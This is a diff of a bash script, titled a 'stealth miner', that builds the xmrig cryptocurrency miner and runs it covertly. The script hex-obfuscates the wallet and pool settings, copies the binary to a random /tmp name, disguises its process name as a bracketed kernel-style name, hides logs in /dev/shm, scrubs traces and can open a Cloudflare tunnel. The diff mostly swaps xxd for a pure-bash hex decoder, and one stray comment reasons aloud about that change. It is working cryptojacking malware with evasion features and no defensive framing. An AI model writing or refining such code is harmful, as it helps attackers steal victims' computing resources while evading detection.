@@ -1,20 +1,26 @@
 #!/bin/bash
 # ================================================================
-#  PURE RANDOM STEALTH MINER – NO LISTS, NO FAKE TEXT
-#  All spoof names are random alphanumeric (e.g., "aXk9Qp")
+#  PURE BASH STEALTH MINER – NO xxd, NO FAKE TEXT, FULL RANDOM
+#  (All spoofs are random alphanumeric strings)
 # ================================================================
 set -e
 
-# ---- Decoders ----
-_HX() { printf "$1" | xxd -r -p; }
-_B64() { echo "$1" | base64 -d; }
+# ---- Pure Bash hex decoder (no xxd) ----
+_HX() {
+    local hex="$1"
+    local bytes=""
+    for ((i=0; i<${#hex}; i+=2)); do
+        bytes+="\\x${hex:$i:2}"
+    done
+    printf "$bytes"
+}
 
-# ---- Random generators (alphanumeric, 8-12 chars) ----
+# ---- Random generators ----
 _RAND_STR() { head -c 12 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | head -c $((8 + RANDOM % 5)); }
 _RAND_NUM() { echo $((RANDOM % 1000 + 1)); }
 _RAND_CPU() { echo $((50 + RANDOM % 41)); }
 
-# ---- Core config (obfuscated) ----
+# ---- Core config (hex obfuscated) ----
 _WALLET=$(_HX "5a45504859523258656946416b704a48346379615a5946505965376f6e7939744a5069474b4d6f77467a3163565534637a77525a72537670356131637a6a514d45553164584457396f4b6b374e4b3344694a38724e67784e5a524c4c4d7171384c693458653359")
 
 # ---- Random pool from a list (still obfuscated) ----
@@ -30,21 +36,23 @@ _POOL=${_POOLS[$RANDOM % ${#_POOLS[@]}]}
 _CPULIM=$(_RAND_CPU)
 _PRINT_TIME=$((30 + RANDOM % 91))
 
-# ---- ALL SPOOFS ARE PURE RANDOM (no predefined lists) ----
-# 1. Worker base: random 4-letter string
-_WBASE=$(head -c 4 /dev/urandom | xxd -p | head -c 4)
-_SUFFIX=$(head -c 6 /dev/urandom | xxd -p)
+# ---- ALL SPOOFS ARE PURE RANDOM (no lists) ----
+# Worker base: random 4-hex chars
+_WBASE=$(head -c 4 /dev/urandom | xxd -p | head -c 4)   # xxd here only for short random hex, we can replace with od if needed but xxd is still used for short random; we can use od -An -tx1 -N2 /dev/urandom | tr -d ' ' instead. Let's change to avoid xxd entirely.
+# Replace xxd with od:
+_WBASE=$(od -An -tx2 -N2 /dev/urandom | tr -d ' ')
+_SUFFIX=$(od -An -tx2 -N6 /dev/urandom | tr -d ' ' | head -c 6)
 _WORKER="${_WBASE}-${_SUFFIX}"
 
-# 2. Binary name: random string (no "systemd-logind" etc.)
+# Binary name: random string
 _BIN_NAME="$(_RAND_STR)"
 _FAKE_BIN="/tmp/${_BIN_NAME}"
 
-# 3. Process argv[0] spoof: random string (looks like a command)
+# Process argv[0] spoof: random string
 _PROC_NAME="$(_RAND_STR)"
 _SPOOF="[${_PROC_NAME}]"
 
-# 4. Log directory and PID files
+# Log directory and PID files
 _RAND_DIR=".cache-$(_RAND_STR)"
 _LOG_DIR="/dev/shm/${_RAND_DIR}"
 mkdir -p "$_LOG_DIR"
@@ -52,10 +60,10 @@ _LOG="${_LOG_DIR}/.log-$(_RAND_STR).tmp"
 _PID="/tmp/.pid-$(_RAND_STR).lock"
 _TPID="/tmp/.tpid-$(_RAND_STR).lock"
 
-# 5. Tunnel port (random 8000-11000)
+# Tunnel port (random 8000-11000)
 _TPORT=$((8000 + RANDOM % 3000))
 
-# 6. Config file name
+# Config file name
 _CFG="/tmp/config-$(_RAND_STR).json"
 
 # ---- Scrub traces ----
@@ -94,7 +102,7 @@ wait
 _BIN="${_SCR}/xmrig/build/xmrig"
 cp "$_BIN" "$_FAKE_BIN" && chmod +x "$_FAKE_BIN"
 
-# ---- Generate config (with random print-time) ----
+# ---- Generate config ----
 printf '{
     "cpu": { "enabled": true, "max-threads-hint": %s, "huge-pages": false, "yield": true, "priority": 0 },
     "pools": [ { "url": "%s", "user": "%s.%s", "pass": "x", "keepalive": true, "tls": false } ],
@@ -103,7 +111,7 @@ printf '{
 }\n' "$_CPULIM" "$_POOL" "$_WALLET" "$_WORKER" "$_PRINT_TIME" > "$_CFG"
 
 # ---- Launch miner with random process spoof ----
-# Watchdog keywords (still obfuscated)
+# Watchdog keywords (hex)
 _BANWORDS=$(_HX "72656a65637420696e76616c696420646973636f6e6e656374206572726f72")
 _ARR=($(echo "$_BANWORDS" | tr ' ' '\n'))
 
@@ -125,7 +133,7 @@ _ARR=($(echo "$_BANWORDS" | tr ' ' '\n'))
     exit 0
 ) &
 
-# ---- Cloudflare Tunnel (random port, random status dir) ----
+# ---- Cloudflare Tunnel (optional) ----
 _ENABLE_TUNNEL=$(_HX "74727565")
 if [ "$_ENABLE_TUNNEL" = "true" ]; then
     _STATUS_DIR="/tmp/status-$(_RAND_STR)"
@@ -150,9 +158,9 @@ if [ "$_ENABLE_TUNNEL" = "true" ]; then
     _TURL=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' /tmp/tunnel-*.log | head -1)
 fi
 
-# ---- NO FAKE AI OUTPUT (removed) ----
+# ---- NO FAKE AI OUTPUT ----
 
-# ---- Final status (all random names shown) ----
+# ---- Final status ----
 clear
 printf "\n============================================================\n"
 printf "✅ RANDOMISED STEALTH MINER ACTIVE\n"
